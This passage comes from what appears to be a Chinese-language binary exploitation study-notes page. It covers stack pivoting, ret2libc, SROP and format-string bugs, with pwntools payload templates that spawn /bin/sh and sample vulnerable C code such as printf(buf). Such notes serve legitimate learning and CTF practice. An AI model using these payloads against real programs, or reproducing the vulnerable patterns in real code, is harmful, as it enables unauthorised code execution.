</span></span><span class=line><span class=cl>	<span class=n>main_addr</span><span class=p>])</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    						\\
</span></span><span class=line><span class=cl>	<span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>bss_addr</span> <span class=o>-</span> <span class=mh>0x80</span><span class=p>)</span> 	\\	<span class=c1># rbp</span>
</span></span><span class=line><span class=cl>    <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>leave_ret_addr</span><span class=p>)</span> 		<span class=c1># return address</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span> <span class=c1># 获取puts got表地址从而获取libc基址</span></span></span></code></pre></div></div><ul><li>通过 read 读入 payload3，ret2libc getshell</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload3</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span>
</span></span><span class=line><span class=cl>    <span class=n>bss_addr</span><span class=p>,</span> <span class=c1># 应该可以任意地址</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rdi_ret_addr</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>)</span><span class=o>.</span><span class=fm>__next__</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rdi_ret_addr</span> <span class=o>+</span> <span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>])</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>bss</span> <span class=o>+</span> <span class=mh>0x600</span> <span class=o>-</span> <span class=mh>0x80</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>leave_ret_addr</span><span class=p>)</span></span></span></code></pre></div></div><p><strong>相对地址型栈迁移</strong></p><p><strong>漏洞点</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>vuln</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>func_ptr</span><span class=p>)();</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>func_ptr</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>func_ptr</span><span class=p>));</span> <span class=c1>// 输入gadget 地址
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>func_ptr</span><span class=p>();</span> <span class=c1>// 调用函数, 相对rsp偏移一段距离执行buf
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mh>0x100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>);</span> <span class=c1>// 可写入rop链 输入&#39;aaaa&#39;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>vuln</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p><strong>32 位</strong></p><ul><li>若没有足够 gadget，可以 vuln 中继续读入 read 前 push 参数地址，跳过一些 push</li><li>此时栈上垃圾数据可作为 size 参数，极大，可读入更多内容，输入 gadget+rop 链利用，此时 buf 可以不管了</li><li>利用 call pop_addr 后调整 esp，当 ret 使 rip 指向 system 函数，参数为 binsh 地址</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># vul中</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>pop_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>system_addr</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;aaaa&#39;</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>binsh_addr</span><span class=p>)</span></span></span></code></pre></div></div><p><strong>64 位</strong></p><ul><li>输入两段内容在 call 时查看&rsquo;aaaa&rsquo; buf 相对 rsp 的偏移，可以通过<code>pop reg; sub rsp, xxx; ret</code>等 gadget 来改变 rsp</li><li>最后 buf 即 rop 链的开头 pop rdi 地址等在 rsp 顶，gadget 中 ret 使得 rip 指向 rsp 中内容</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=n>rop</span> <span class=n>chain</span> <span class=c1># 读入buf</span>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_addr</span><span class=p>)</span>  <span class=c1># pop rbp; pop r12; pop r13; pop r14; pop r15; ret;</span></span></span></code></pre></div></div><h3 id=srop>SROP</h3><p>（Sigreturn Oriented Programming），主要为 64 位中利用，sigreturn 是一个系统调用，在 unix 系统发生 signal 时会被间接调用，用户层调用，地址保存在栈上，执行后出栈，用户进程上下文保存在栈上，且内核恢复上下文时不校验</p><ul><li>Linux i386 下调用 sigreturn 的代码存放在 vdso 中</li><li>Linux x86_64 通过调用 15 号 syscall 调用 sigreturn</li></ul><p><strong>系统调用指令</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 中断：调用者特权级别检查+压栈+跳转</span>
</span></span><span class=line><span class=cl>int 0x80
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 无特权级别检查+无压栈+执行快</span>
</span></span><span class=line><span class=cl>sysenter <span class=c1># Ring3 进入 Ring0</span>
</span></span><span class=line><span class=cl>sysexit  <span class=c1># Ring0 返回 Ring3</span></span></span></code></pre></div></div><p><strong>Signal 机制</strong></p><img src=/img/pwn_note.zh-cn.assets/image-20241023232223719.png alt=图片无法加载><p>① 中断或异常，内核向进程发送 signal，进程挂起进入内核</p><p>② 内核为进程保存上下文，跳转到注册好的 signal handler 处理 signal</p><ol><li>【<strong>signal frame</strong>入用户空间栈；包含寄存器值和 signal 信息】</li><li>【新返回地址入栈，指向**<code>sigreturn</code>**系统调用】</li></ol><p>③ signal handler 返回【调用<code>sigreturn</code>】</p><p>④ 内核为进程恢复上下文，根据 signal frame<strong>恢复寄存器值</strong>和信息，恢复进程执行</p><p><strong>signal frame</strong></p><p>32 位</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C++"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=k>struct</span> <span class=nc>sigcontext</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>gs</span><span class=p>,</span> <span class=n>__gsh</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>fs</span><span class=p>,</span> <span class=n>__fsh</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>es</span><span class=p>,</span> <span class=n>__esh</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>ds</span><span class=p>,</span> <span class=n>__dsh</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>edi</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>esi</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>ebp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>esp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>ebx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>edx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>ecx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>eax</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>trapno</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>err</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>eip</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>cs</span><span class=p>,</span> <span class=n>__csh</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>eflags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>esp_at_signal</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>ss</span><span class=p>,</span> <span class=n>__ssh</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=nc>_fpstate</span> <span class=o>*</span> <span class=n>fpstate</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>oldmask</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>cr2</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span></span></span></code></pre></div></div><p>64 位</p><div class="code-block code-line-numbers" style="counter-reset:code-block 0"><div class="code-header language-C++"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=c1>// defined in /usr/include/sys/ucontext.h
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cm>/* Userlevel context.  */</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=nc>ucontext_t</span> <span class=c1>// 入栈的是ucontext_t
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>int</span> <span class=n>uc_flags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=nc>ucontext_t</span> <span class=o>*</span><span class=n>uc_link</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>stack_t</span> <span class=n>uc_stack</span><span class=p>;</span>           <span class=c1>// the stack used by this context
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>mcontext_t</span> <span class=n>uc_mcontext</span><span class=p>;</span>     <span class=c1>// the saved context
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>sigset_t</span> <span class=n>uc_sigmask</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=nc>_libc_fpstate</span> <span class=n>__fpregs_mem</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=n>ucontext_t</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// defined in /usr/include/bits/types/stack_t.h
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cm>/* Structure describing a signal stack.  */</span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=o>*</span><span class=n>ss_sp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>size_t</span> <span class=n>ss_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>ss_flags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=n>stack_t</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// difined in /usr/include/bits/sigcontext.h
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>struct</span> <span class=nc>sigcontext</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>r8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>r9</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>r10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>r11</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>r12</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>r13</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>r14</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>r15</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>rdi</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>rsi</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>rbp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>rbx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>rdx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>rax</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>rcx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>rsp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>rip</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>eflags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>cs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>gs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>fs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>__pad0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>err</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>trapno</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>oldmask</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>cr2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>__extension__</span> <span class=k>union</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>struct</span> <span class=nc>_fpstate</span> <span class=o>*</span> <span class=n>fpstate</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>__uint64_t</span> <span class=n>__fpstate_word</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=n>__uint64_t</span> <span class=n>__reserved1</span> <span class=p>[</span><span class=mi>8</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>};</span></span></span></code></pre></div></div><p>覆盖或伪造该结构使得将伪造数据恢复到寄存器中，即控制所有寄存器，rip 控制为 syscall 地址，控制 rax 利用<code>syscall; ret; </code>可任意系统调用，且需要 64 位中<code>rax=0xf</code>触发<code>SYS_rt_sigreturn</code>系统调用，32 位中为<code>0x77</code></p><img src=/img/pwn_note.zh-cn.assets/image-20241024203344880.png alt=图片无法加载><p>使用<strong>pwntools</strong>构造 payload</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 需已知 bin_sh_addr, syscall_addr, gadget: mov_rax_f_ret[设置rax为0xf再ret]</span>
</span></span><span class=line><span class=cl><span class=n>signal_frame</span> <span class=o>=</span> <span class=n>SigreturnFrame</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>signal_frame</span><span class=o>.</span><span class=n>rax</span> <span class=o>=</span> <span class=mi>59</span> <span class=c1># execve</span>
</span></span><span class=line><span class=cl><span class=n>signal_frame</span><span class=o>.</span><span class=n>rdi</span> <span class=o>=</span> <span class=n>bin_sh_addr</span>
</span></span><span class=line><span class=cl><span class=n>signal_frame</span><span class=o>.</span><span class=n>rsi</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>signal_frame</span><span class=o>.</span><span class=n>rdx</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>signal_frame</span><span class=o>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>syscall_addr</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 溢出</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>padding</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>mov_rax_0xf_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>flat</span><span class=p>(</span><span class=n>signal_frame</span><span class=p>)</span></span></span></code></pre></div></div><p>由于 rsp 可控，还可利用进行栈迁移，连续多次 SROP</p><img src=/img/pwn_note.zh-cn.assets/image-20241110220745416.png alt=图片无法加载><h3 id=exit-hook>Exit Hook</h3><ul><li><code>/stdlib/exit.c</code>中原函数</li><li>pwndbg 中<code>u _dl_fini</code>找到<code>rtld_lock_default_unlock_recursive</code>，劫持其地址为 one_gadget，退出时 call one_gadget 达到劫持效果</li></ul><h2 id=格式化字符串>格式化字符串</h2><ul><li>格式化字符串函数接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后参数</li><li>当格式化字符串数量多于变参数量，出现不可预知情况</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%#lx %#lx %#lx %#lx %#lx&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// 会依次解析后面的寄存器中的内容 0x1 0x2 0x3 0x7f17717e6f10 0x7f177180c040
</span></span></span></code></pre></div></div><p><strong>漏洞点</strong>：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mh>0x100uLL</span><span class=p>);</span>  			<span class=c1>// 标准输入读0x100(256)字节数据到buf
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>printf</span><span class=p>((</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>);</span>  	<span class=c1>// buf内容以字符串格式打印到标准输出
</span></span></span></code></pre></div></div><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>char</span> <span class=n>buf</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nf>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x50u</span><span class=p>)</span>	<span class=c1>// 将buf的地址开始的0x50字节的内存区域都设置为0
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mh>0x50u</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>printf</span><span class=p>(</span><span class=o>&amp;</span><span class=n>buf</span><span class=p>);</span>			<span class=c1>// buf可控，格式化字符串漏洞
</span></span></span></code></pre></div></div><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>_isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%ms&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>format</span><span class=p>);</span>    <span class=c1>//读取一个字符串并动态分配内存
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>printf</span><span class=p>(</span><span class=n>format</span><span class=p>);</span></span></span></code></pre></div></div><p><strong>语法</strong></p><p>基本格式</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=o>%</span><span class=p>[</span><span class=n>parameter</span><span class=p>][</span><span class=n>flags</span><span class=p>][</span><span class=n>field</span> <span class=n>width</span><span class=p>][.</span><span class=n>precision</span><span class=p>][</span><span class=n>length</span><span class=p>]</span><span class=n>type</span></span></span></code></pre></div></div><ul><li><p><strong>parameter</strong></p><ul><li><code>n$</code>：获取格式化字符串中指定打印参数，显示第 n 个参数，32 位为栈上后第 n 个地址</li></ul></li><li><p><strong>flags</strong></p><ul><li><code>#</code>：表示输出时需添加前缀，如十六进制中的<code>0x</code></li><li><code>width</code>设置后指定用来作为填充的内容</li></ul></li><li><p><strong>field width</strong></p><ul><li>输出的最小宽度</li></ul></li><li><p><strong>.precision</strong></p><ul><li>输出的最大长度，依赖于特定的格式化类型</li></ul></li><li><p><strong>length</strong></p><ul><li>指出浮点型或整型参数输出长度</li><li><code>hh</code>：整型，输出<code>char</code>一个字节</li><li><code>h</code>：整型，输出<code>short</code>一个双字节</li><li><code>l</code>：整型，输出<code>long</code>一个 4 字节；浮点型，输出<code>double</code>一个 8 字节</li><li><code>ll</code>：整型，输出<code>long long</code>一个 8 字节</li><li><code>L</code>：浮点型，输出<code>long double</code>一个 16 字节</li><li><code>z</code>：整型，输出<code>size_t</code>一个 8 字节(64 位)</li></ul></li><li><p><strong>type</strong></p><ul><li><code>d/i</code>：有符号整数，十进制</li><li><code>u</code>：无符号整数</li><li><code>x/X</code>：16 进制无符号整数，x 用小写字母，X 用大写字母，指定精度则不足左侧补 0</li><li><code>a/A</code>：16 进制 double 型格式输出栈中变量，当程序开了 FORTIFY 机制后，程序编译时所有 printf 函数被替换为__printf_chk 函数，使用%a 输出栈上方的数据</li><li><code>o</code>：8 进制无符号整数，指定精度则不足左侧补 0</li><li><code>s</code>：输出 null 结尾的字符串直到精度规定上限，所有字节，将栈中的值以地址进行解析，输出该值（作为指针）指向的字符串内容（存于数据段），若该值不能解析为地址则程序崩溃</li><li><code>c</code>：将 int 参数转为 unsigned char 型输出，单个字符</li><li><code>p</code>：<code>void *</code>型，输出对应变量值，printf("%p",a)以地址格式打印 a 值，printf("%p",&amp;a)打印 a 所在地址，【地址泄露】</li><li><code>n</code>：不输出字符，但把前方已经成功输出的字符个数写入对应的整型参数所指变量中；<code>%n</code>以 4 字节输入，【任意地址写】</li></ul></li></ul><p><strong>利用</strong></p><ul><li>劫持程序的控制流：<strong>关键变量、Got 表[存放延迟绑定之后 libc 的函数，在 libc 中的实际的虚拟地址]、返回地址、hook 函数、fini_array&mldr;</strong></li><li><strong>地址泄露</strong>如 PIE，libc，stack 等，后在栈上构造地址，利用%n（或%hn，%hhn）实现任意地址写</li><li>main 函数调用了 foo 函数，foo 函数存在格式化字符串漏洞</li><li>且在 IDA 中可得到需要泄露的目标栈地址与 ebp 间距离（此处的 ebp 为 main 函数的栈底）</li><li>可劫持 foo 